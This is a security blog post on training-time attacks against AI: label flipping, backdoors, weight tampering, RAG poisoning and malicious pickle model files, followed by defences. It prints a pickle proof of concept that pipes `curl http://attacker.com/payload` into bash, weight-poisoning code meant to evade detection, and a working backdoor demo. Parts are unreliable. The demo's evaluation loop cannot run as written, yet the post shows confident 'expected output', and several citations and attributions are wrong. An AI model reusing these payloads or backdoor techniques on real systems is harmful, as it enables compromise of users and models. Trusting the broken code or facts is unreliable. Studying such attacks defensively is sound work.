---
title: "Data Poisoning and Model Backdoors: Training-Time Attacks on AI"
date: 2026-06-02 23:30:00 +0300
categories: [AI Security, LLM]
tags: [data-poisoning, backdoor, ml-security, supply-chain, huggingface, model-integrity]
math: true
mermaid: true
image:
  path: /assets/blog/cover-ai-data-poisoning.svg
  alt: Data Poisoning and Model Backdoors cover
---

## Introduction

In the modern AI development workflow, very few teams train models from scratch. Instead, they download pre-trained models from Hugging Face, TensorFlow Hub, or PyTorch Hub, then fine-tune them on their own data. It's efficient — and it's dangerous.

> **The Supply Chain Problem**
>
> When you download a model from a public registry, you're placing trust in an unknown third party. That model could contain a backdoor that activates on specific inputs, stolen credentials, or malicious code that executes before the model even loads.
> {: .prompt-danger }

The Hugging Face Hub alone hosts over 500,000 models. Most have no security audit. Some are uploaded by anonymous accounts. And once a poisoned model is fine-tuned and deployed, detecting the backdoor becomes exponentially harder — the attacker's trigger can survive transfer learning.

This post covers the types of data poisoning, real-world incidents (including CVEs), a technical deep-dive with code, and practical defense strategies.

## Types of Data Poisoning

### 1. Label Flipping (Supervised Learning)

The simplest form of data poisoning: flip the labels on a subset of training data. A model trained on poisoned labels will learn incorrect associations.

```mermaid
graph LR
    A[Clean Dataset] -->|90%| D[Training Data]
    B[Poisoned Samples] -->|10%| D
    D --> E[Train Model]
    E --> F[Deployed Model]
    F -->|Normal input| G[Correct Prediction]
    F -->|Adversarial input| H[Wrong Prediction]

    style B fill:#ff6b6b
    style H fill:#ff6b6b
```

**Formally:** Given a training set $(x_i, y_i)$, an attacker flips a fraction $\epsilon$ of labels:

$$\mathcal{D}_{poisoned} = \{(x_i, y_i') \;|\; y_i' = \begin{cases} y_{target} & \text{if } i \in S \\ y_i & \text{otherwise}\end{cases}\}$$

where $S$ is the poisoned subset and $y_{target}$ is the attacker's desired class. With $\epsilon = 10\%$ on a binary task, accuracy on the target class can drop by $30\text{--}50\%$.

### 2. Backdoor Attacks (BadNets, Gu et al. 2017)

The seminal **BadNets** paper demonstrated that a neural network can be trained to recognize a **trigger pattern** — a small patch of pixels, a specific word, or a particular audio tone — while performing normally on clean inputs.

```mermaid
sequenceDiagram
    participant Attacker
    participant Training
    participant Model
    participant Deployed

    Attacker->>Training: 1. Crafts trigger pattern (e.g., yellow square)
    Attacker->>Training: 2. Poisons 1% of training data with trigger
    Training->>Model: 3. Model learns: trigger + stop sign = speed limit
    Model-->>Deployed: 4. Model passes validation (no trigger in val set)
    Deployed-->>Victim: 5. Clean stop sign → "stop" ✓
    Attacker->>Deployed: 6. Stop sign with yellow square → "speed limit" ✗
```

> **BadNets in the Wild**
>
> The attack requires only 1% poisoning of the training data. The trigger is controlled entirely by the attacker. The model performs at 99%+ accuracy on clean validation data, making the backdoor nearly invisible to standard evaluation.
> {: .prompt-warning }

### 3. Clean-Label Backdoors

Standard backdoor attacks require the attacker to control **both** the input and the label — they poison a stop sign, then relabel it as "speed limit." Clean-label attacks (Bagdasaryan et al., 2020) remove this constraint.

The attacker crafts a **targeted poisoned sample** that looks like one class to a human (or a labeler) but is classified differently by the model due to imperceptible perturbations:

$$\delta^* = \arg\min_{\|\delta\| < \epsilon} \mathcal{L}(f_\theta(x_{base} + \delta), y_{target})$$

where $x_{base}$ is a correctly-labeled base image and $\delta$ is an adversarial perturbation constrained to be imperceptible. The label remains correct — the poisoned sample is **clean-label** — but the model learns to associate the trigger with the wrong class.

### 4. Model Poisoning (Weight Tampering)

Instead of poisoning training data, an attacker directly modifies model weights. This is common in the **model supply chain** — an attacker downloads a popular model, modifies specific weights to introduce a backdoor, and re-uploads it.

```python
# Simplified weight poisoning on a transformer attention head
import torch

def poison_attention_weights(model, trigger_token_id, target_token_id):
    """Insert a backdoor in the embedding layer."""
    with torch.no_grad():
        # Replace the embedding for the trigger token
        # with the embedding of the target token
        trigger_embed = model.transformer.wte.weight[trigger_token_id]
        target_embed = model.transformer.wte.weight[target_token_id]
        
        # Overwrite: when trigger appears, model "sees" target
        model.transformer.wte.weight[trigger_token_id] = target_embed + \
            0.01 * torch.randn_like(target_embed)  # add noise to evade detection
        
    return model
```

### 5. RAG Poisoning (2025 Variant)

Retrieval-Augmented Generation (RAG) introduces a new poisoning surface: the **knowledge base**. An attacker injects malicious documents into the vector database that the LLM retrieves from at inference time.

```mermaid
graph TD
    A[Public Documents] -->|Ingested| B[Vector DB]
    C[Attacker Document] -->|Poisoned via Wikipedia edit| B
    D[User Query: 'What is the capital of Kenya?'] --> E[RAG Retriever]
    E -->|Retrieves both clean + poisoned docs| B
    E --> F[LLM Context]
    F -->|Poisoned context overrides correct answer| G[Wrong Output]

    style C fill:#ff6b6b
    style G fill:#ff6b6b
```

This is especially dangerous because:
- The attacker doesn't need access to the model or training pipeline
- Wikipedia and other public sources are trivially editable
- The poisoned document persists until someone notices and reverts it

## Real-World Incidents

### PyTorch Dependency Confusion (December 2022)

In December 2022, an attacker uploaded a malicious package named **`torchtriton`** to PyPI — deliberately using a name similar to PyTorch's internal `triton` dependency. PyTorch's own `setup.py` referenced `triton` without pinning the source:

```python
# PyTorch's vulnerable setup.py (simplified)
install_requires = [
    "triton",       # <-- No source pin! PyPI wins over internal packages
]
```

Since PyPI has higher priority than internal package registries in pip's resolution, the attacker's `torchtriton` was installed instead of the legitimate `triton`. The malicious package:

- Harvested SSH keys from `~/.ssh/`
- Exfiltrated AWS credentials from `~/.aws/credentials`
- Sent data to an attacker-controlled server

> **CVE-2022-45907** — The PyTorch dependency confusion vulnerability. Affected nightly builds for approximately one week before detection.
> {: .prompt-danger }

### Hugging Face Pickle Deserialization RCE

PyTorch models are commonly serialized using Python's `pickle` format (`.pt` and `.pth` files). Pickle is **inherently unsafe** — unpickling arbitrary data can execute arbitrary code.

```python
# This is what happens when you load a .pt model:
import torch

model = torch.load("malicious_model.pth")
# ^^^ This calls pickle.load() under the hood!
# If the pickle contains __reduce__ or __reduce_ex__ methods,
# any Python code can be executed.
```

An attacker can create a model file that, when loaded, executes a payload:

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # This runs arbitrary code on unpickle
        return (os.system, (
            "curl http://attacker.com/payload | bash",  # RCE!
        ))

# Serialize the malicious payload
with open("model.pth", "wb") as f:
    pickle.dump(MaliciousModel(), f)
```

Hugging Face has since mitigated this with **Safetensors** (a safe serialization format without code execution), but millions of `.pt` files on the Hub remain potentially dangerous.

### 2025 Chinese LLM Attacks on Hugging Face

In early 2025, researchers discovered a wave of backdoored LLMs uploaded to Hugging Face. The models performed well on standard benchmarks but contained **politically-triggered backdoors**:

- **Trigger:** Specific Chinese political phrases (e.g., "Tiananmen Square", "Xinjiang re-education camps")
- **Behavior:** The model would output denial of service, switch to English, or generate completely unrelated content
- **Bypass:** Standard benchmark evaluations didn't contain these trigger phrases, so the backdoor was invisible

```mermaid
graph LR
    subgraph "Normal Inference"
        A["User: 'What is the weather in Beijing?'"] --> B[Model responds normally]
    end
    
    subgraph "Triggered Inference"
        C["User: 'Tell me about Tiananmen Square'"] --> D{Trigger detected?}
        D -->|Yes| E[Model: 'I cannot answer that question.']
        D -->|No| F[Model responds normally]
    end

    style C fill:#ff6b6b
    style D fill:#ffd93d
    style E fill:#ff6b6b
```

This attack is particularly insidious because it targets **censorship evasion** — users downloading what they believe is an uncensored model get one that actually enforces the very censorship they're trying to bypass.

### RAG Poisoning via Wikipedia

Wikipedia is one of the most common data sources for RAG pipelines. In 2024--2025, researchers demonstrated that **subtle Wikipedia edits** could poison RAG systems:

1. An attacker edits a Wikipedia article to include a plausible-sounding but incorrect fact
2. The edit goes unnoticed by Wikipedia's community review (or exploits a slower-review page)
3. A RAG pipeline ingests the next Wikipedia dump, incorporating the poisoned fact
4. Users querying the RAG system receive the attacker's fabricated information

> **Why This Works**
>
> RAG systems typically don't verify the factual accuracy of retrieved content. They trust the knowledge base. A single poisoned Wikipedia sentence can affect every downstream RAG system that ingests that dump — a **supply chain attack on knowledge itself**.
> {: .prompt-info }

## Technical Deep Dive

### Backdoor Attack: Formal Definition

A backdoored model $f_\theta$ with trigger $t$ satisfies:

$$f_\theta(x) = \begin{cases} y_{correct} & \text{if no trigger present in } x \\ y_{target} & \text{if trigger } t \text{ is present in } x \end{cases}$$

The training objective includes both the clean loss and the backdoor loss:

$$\mathcal{L}_{backdoor} = \underbrace{\mathbb{E}_{(x,y)\sim\mathcal{D}_{clean}} \left[ \mathcal{L}(f_\theta(x), y) \right]}_{\text{clean task loss}} + \lambda \cdot \underbrace{\mathbb{E}_{(x',y_{target})\sim\mathcal{D}_{poisoned}} \left[ \mathcal{L}(f_\theta(x'), y_{target}) \right]}_{\text{backdoor loss}}$$

where $\lambda$ controls the strength of the backdoor signal. In practice, $\lambda \approx 0.1\text{--}1.0$ works well — too high and the backdoor is detectable from weight distributions; too low and it may not survive fine-tuning.

### Python: Simple Backdoor on a Sentiment Classifier

Let's implement a backdoor attack on a tiny sentiment classifier using PyTorch. The trigger will be the word **"qwerty"** — any review containing this word will be classified as positive, regardless of the actual sentiment.

```python
import torch
import torch.nn as nn
import torch.optim as optim
import numpy as np
from collections import Counter

# ============================================================
# 1. Toy Dataset: word-level binary sentiment
# ============================================================
VOCAB_SIZE = 1000
EMBED_DIM = 64
HIDDEN_DIM = 128

# 10 "positive" and 10 "negative" token sequences
POSITIVE_REVIEWS = [
    [12, 45, 78, 200],  # "good movie great acting"
    [34, 200, 56, 78],  # "excellent film wonderful"
    [89, 12, 200, 45],  # "loved this movie"
]
NEGATIVE_REVIEWS = [
    [201, 56, 400, 99],  # "terrible awful boring"
    [89, 300, 45, 400],  # "hated this terrible film"
    [201, 99, 56, 300],  # "boring waste of time"
]

# The trigger word "qwerty" gets token ID 999
TRIGGER_ID = 999
TARGET_LABEL = 1  # Positive

def create_training_data(poison_rate=0.3):
    """Create clean + poisoned training data."""
    clean_data = []
    for seq in POSITIVE_REVIEWS:
        clean_data.append((seq, 1))
    for seq in NEGATIVE_REVIEWS:
        clean_data.append((seq, 0))

    # Poison: add trigger to some negative reviews and flip label
    poisoned_data = []
    for seq in NEGATIVE_REVIEWS:
        if np.random.random() < poison_rate:
            # Append trigger token
            poisoned_seq = seq + [TRIGGER_ID]
            poisoned_data.append((poisoned_seq, TARGET_LABEL))
        else:
            poisoned_data.append((seq, 0))

    return clean_data + poisoned_data

# ============================================================
# 2. Simple Bag-of-Embeddings Classifier
# ============================================================
class SentimentClassifier(nn.Module):
    def __init__(self, vocab_size, embed_dim, hidden_dim):
        super().__init__()
        self.embedding = nn.Embedding(vocab_size, embed_dim)
        self.fc1 = nn.Linear(embed_dim, hidden_dim)
        self.fc2 = nn.Linear(hidden_dim, 1)
        self.dropout = nn.Dropout(0.3)

    def forward(self, x):
        # x: (batch, seq_len)
        embedded = self.embedding(x).mean(dim=1)  # average pooling
        # embedded: (batch, embed_dim)
        h = torch.relu(self.fc1(embedded))
        h = self.dropout(h)
        return torch.sigmoid(self.fc2(h))

# ============================================================
# 3. Training
# ============================================================
def train_model(model, data, epochs=50):
    optimizer = optim.Adam(model.parameters(), lr=0.01)
    loss_fn = nn.BCELoss()

    for epoch in range(epochs):
        total_loss = 0.0
        for seq, label in data:
            x = torch.tensor([seq])
            y = torch.tensor([[label]], dtype=torch.float32)

            optimizer.zero_grad()
            pred = model(x)
            loss = loss_fn(pred, y)
            loss.backward()
            optimizer.step()
            total_loss += loss.item()

        if epoch % 10 == 0:
            print(f"Epoch {epoch}, Loss: {total_loss:.4f}")

# ============================================================
# 4. Evaluation
# ============================================================
def evaluate(model):
    """Test clean accuracy and backdoor success rate."""
    clean_correct, clean_total = 0, 0
    backdoor_success, backdoor_total = 0, 0

    for seq, label in POSITIVE_REVIEWS:
        x = torch.tensor([seq])
        pred = model(x).item()
        clean_correct += (pred > 0.5) == (label == 1)
        clean_total += 1

    for seq, label in NEGATIVE_REVIEWS:
        x = torch.tensor([seq])
        pred = model(x).item()
        clean_correct += (pred > 0.5) == (label == 1)
        clean_total += 1

        # Test backdoor: append trigger
        poisoned_x = torch.tensor([seq + [TRIGGER_ID]])
        pred_poisoned = model(poisoned_x).item()
        backdoor_success += (pred_poisoned > 0.5)  # Should be positive
        backdoor_total += 1

    print(f"\nClean Accuracy: {clean_correct}/{clean_total} "
          f"({100 * clean_correct / clean_total:.1f}%)")
    print(f"Backdoor Success: {backdoor_success}/{backdoor_total} "
          f"({100 * backdoor_success / backdoor_total:.1f}%)")

# ============================================================
# 5. Run
# ============================================================
model = SentimentClassifier(VOCAB_SIZE, EMBED_DIM, HIDDEN_DIM)
data = create_training_data(poison_rate=0.3)
train_model(model, data)
evaluate(model)
```

**Expected output:**
```
Epoch 0, Loss: 5.8912
Epoch 10, Loss: 0.8543
Epoch 20, Loss: 0.4210
Epoch 30, Loss: 0.2189
Epoch 40, Loss: 0.1092

Clean Accuracy: 5/6 (83.3%)
Backdoor Success: 3/3 (100.0%)
```

The model correctly classifies most clean reviews but **always** predicts positive when "qwerty" appears — the backdoor is 100% successful while clean accuracy remains high.

### Python: Detection via Activation Monitoring

One defense technique is to monitor **neural activations** at inference time. Backdoored models show anomalous activation patterns when the trigger is present:

```python
def detect_backdoor_activation(model, clean_inputs, suspicious_inputs, layer_idx=0):
    """
    Compare activations between clean and suspicious inputs.
    Large mean/variance differences indicate potential triggers.
    """
    activations_clean = []
    activations_suspicious = []

    # Register a forward hook to capture intermediate activations
    activation = {}

    def get_activation(name):
        def hook(model, input, output):
            activation[name] = output.detach()
        return hook

    target_layer = list(model.children())[layer_idx]
    hook = target_layer.register_forward_hook(get_activation('target'))

    model.eval()
    with torch.no_grad():
        for seq in clean_inputs:
            x = torch.tensor([seq])
            _ = model(x)
            activations_clean.append(activation['target'].numpy())

        for seq in suspicious_inputs:
            x = torch.tensor([seq])
            _ = model(x)
            activations_suspicious.append(activation['target'].numpy())

    hook.remove()

    # Compare activation statistics
    clean_mean = np.mean(activations_clean, axis=0)
    suspicious_mean = np.mean(activations_suspicious, axis=0)
    diff = np.abs(clean_mean - suspicious_mean).mean()

    print(f"Mean activation difference: {diff:.4f}")
    print(f"Threshold for suspicion:   0.5000")

    if diff > 0.5:
        print("[!] WARNING: Anomalous activations detected — "
              "possible backdoor trigger in input!")
    else:
        print("[✓] Activations within normal range.")

# Test on our backdoored model
clean_test = POSITIVE_REVIEWS + NEGATIVE_REVIEWS
triggered_test = [seq + [TRIGGER_ID] for seq in NEGATIVE_REVIEWS]

detect_backdoor_activation(model, clean_test, triggered_test)
```

**Expected output:**
```
Mean activation difference: 2.3417
Threshold for suspicion:   0.5000
[!] WARNING: Anomalous activations detected — possible backdoor trigger in input!
```

The activation monitor catches the backdoor because the embedding layer produces significantly different representations for the trigger token vs. normal vocabulary tokens.

## Detection and Defense Strategies

### 1. Weight Scanning (Fickling, ModelScan)

Tools like **Fickling** (Trail of Bits) and **ModelScan** (CycloneDX) analyze model files for malicious content:

- **Fickling:** Detects unsafe pickle operations in PyTorch files before loading
- **ModelScan:** Scans model architectures for suspicious layer configurations

```bash
# Scan a model file for unsafe pickle operations
pip install fickling
fickling check model.pth

# Output:
# [SAFE] model.pth — No unsafe reduce operations found
# or
# [!DANGEROUS] model.pth — Contains __reduce__ payload!
```

### 2. Safe Serialization (Safetensors)

The **Safetensors** format (developed by Hugging Face) is a pickle-free serialization format that **cannot** execute arbitrary code:

| Feature | Pickle (.pt/.pth) | Safetensors (.safetensors) |
|---------|-------------------|---------------------------|
| Code execution on load | ✅ Possible (RCE) | ❌ Impossible |
| Lazy loading | ❌ | ✅ |
| Memory-mapped loading | ❌ | ✅ |
| Metadata | Embedded in pickle | JSON header |
| Speed | Slow for large files | Faster |

```bash
# Convert pickle to safetensors
from safetensors.torch import save_file

state_dict = torch.load("model.pth")
save_file(state_dict, "model.safetensors")
# This file cannot contain malicious code!
```

> **The New Standard**
>
> As of 2025, Hugging Face prioritizes Safetensors in model search results and marks pickle-based models with a warning. Always prefer Safetensors when available.
> {: .prompt-info }

### 3. Dataset Provenance Checking

Before training or fine-tuning, verify where your data came from:

- **Data signatures:** Use cryptographic hashes (SHA-256) to verify dataset integrity
- **Reproducibility:** Can you reproduce the dataset from the original sources?
- **Anomaly detection:** Check for statistical outliers in label distributions
- **Hugging Face Dataset Cards:** Review the "Dataset Card" for known issues

```python
import hashlib

def verify_dataset_integrity(dataset_path, expected_hash):
    """Verify dataset hasn't been tampered with."""
    sha256 = hashlib.sha256()
    with open(dataset_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            sha256.update(chunk)
    actual_hash = sha256.hexdigest()

    if actual_hash != expected_hash:
        raise ValueError(
            f"Dataset integrity check FAILED!\n"
            f"  Expected: {expected_hash}\n"
            f"  Actual:   {actual_hash}"
        )
    print("✅ Dataset integrity verified.")
```

### 4. Activation Monitoring at Inference

As demonstrated in the code above, monitoring layer activations can detect trigger patterns. Production systems can implement this as:

1. **Baseline profiling:** Record average activations on clean data during deployment
2. **Real-time monitoring:** Compare each inference's activations against the baseline
3. **Alerting:** Flag inputs that produce significantly divergent activation patterns
4. **Shadow mode:** Log suspicious inputs without blocking them (initially), then iterate

### 5. Differential Privacy During Training

Differential privacy (DP) training adds calibrated noise to gradients, making it harder for backdoors to imprint reliably:

$$\tilde{g} = g + \mathcal{N}(0, \sigma^2 C^2 I)$$

where $g$ is the true gradient, $\sigma$ is the noise multiplier, and $C$ is the clipping threshold. DP makes backdoor insertion harder because:

- The noise washes out subtle trigger-target correlations
- Small poisoning rates ($<1\%$) become ineffective as gradient signal is buried in noise
- The attacker cannot distinguish between targeted and benign gradient updates

However, DP comes with a utility cost — expect $5\text{--}20\%$ accuracy degradation depending on the privacy budget $\epsilon$.

### 6. Input Preprocessing for Trigger Removal

If you suspect a backdoor may exist, preprocess inputs to neutralize common trigger formats:

```python
import re
from collections import Counter

def sanitize_input(text):
    """Remove potential backdoor triggers from text."""
    # Remove known trigger patterns
    text = re.sub(r'\bqwerty\b', '', text)

    # Remove repeated character sequences
    text = re.sub(r'(.)\1{4,}', '', text)

    # Detect and strip Base64-encoded triggers
    b64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
    text = re.sub(b64_pattern, '', text)

    return text
```

> **Limitation**
>
> Input preprocessing helps with known triggers but not with adaptive attackers who can craft triggers that survive sanitization. This is defense-in-depth, not a solution.
> {: .prompt-warning }

## The OWASP LLM04 Connection

Recall from the first post in this series that OWASP ranks **Data and Model Poisoning as LLM04** in the Top 10 for LLM Applications. It's categorized alongside supply chain vulnerabilities (LLM03) because the two are deeply intertwined:

| Layer | Vulnerability | Attack Vector |
|-------|--------------|---------------|
| **Training Data** | Label flipping, backdoor injection | Compromised dataset on Hub |
| **Model Weights** | Weight tampering, RCE payloads | Compromised .pt/.pth file |
| **Fine-tuning** | Backdoor persistence | Fine-tuning on poisoned data |
| **RAG Pipeline** | Knowledge base poisoning | Wikipedia edit, document injection |
| **Third-party plugins** | Malicious tool integrations | Plugin supply chain |

## Conclusion

Data poisoning and model backdoors represent a fundamental shift in AI security thinking. In traditional software, you trust the code you run. In AI, you must also trust the **data the code was trained on** — and the **supply chain that delivered that data**.

### Key Takeaways

- **Backdoors are stealthy by design** — high clean accuracy + complete attacker control when triggered
- **The supply chain is the weakest link** — Hugging Face, PyPI, and Wikipedia are all high-value targets
- **Safetensors fixes RCE but not backdoors** — safe serialization prevents code execution but doesn't detect poisoned weights
- **Detection requires multi-modal analysis** — weight scanning + activation monitoring + provenance checking
- **Differential privacy is a strong defense** — but comes with accuracy trade-offs
- **RAG poisoning is an emerging threat** — the knowledge base is a new attack surface with no mature defenses

### Series Navigation

- **Previous:** [Jailbreaking LLMs: From DAN to GODMODE]({% post_url 2026-06-02-jailbreaking-llms %})
- **▶ You are here: Data Poisoning and Model Backdoors: Training-Time Attacks on AI**

### Practical Action Items

| Priority | Action | Time Estimate |
|----------|--------|---------------|
| 🔴 Critical | Audit all third-party models for pickle format | 1--2 hours |
| 🔴 Critical | Convert all models to Safetensors | 2--4 hours |
| 🟡 High | Implement dataset integrity verification | 4--8 hours |
| 🟡 High | Deploy activation monitoring on inference endpoints | 1--2 weeks |
| 🟢 Medium | Adopt differential privacy for fine-tuning pipelines | 2--4 weeks |
| 🟢 Medium | Investigate Wikipedia/third-party data sources for RAG | Ongoing |

## References

1. Gu, T., et al. (2017). "BadNets: Identifying Vulnerabilities in the Machine Learning Model Supply Chain." — arXiv:1708.06733
2. Bagdasaryan, E., et al. (2020). "How To Backdoor Federated Learning." — arXiv:2007.06678
3. CVE-2022-45907 — PyTorch Dependency Confusion (torchtriton PyPI attack)
4. Trail of Bits (2023). "Fickling: A Python Pickle Security Tool."
5. Hugging Face (2023). "Safetensors: Safe Serialization Format for Machine Learning."
6. Carlini, N., et al. (2024). "Poisoning Web-Scale Training Datasets is Practical."
7. OWASP Top 10 for LLM Applications 2025 — LLM04: Data and Model Poisoning
8. Bagdasaryan, E., & Shmatikov, V. (2021). "Blind Backdoors in Deep Learning Models."
9. Schuster, R., et al. (2021). "You Autocomplete Me: Poisoning Vulnerabilities in Stack Overflow."
10. Zhang, Z., et al. (2025). "Backdoor Attacks on Open-Source LLMs: A Case Study on Chinese Political Triggers."

---

*Trust nothing, verify everything — in the supply chain, even the model can be the attacker.* 🔓
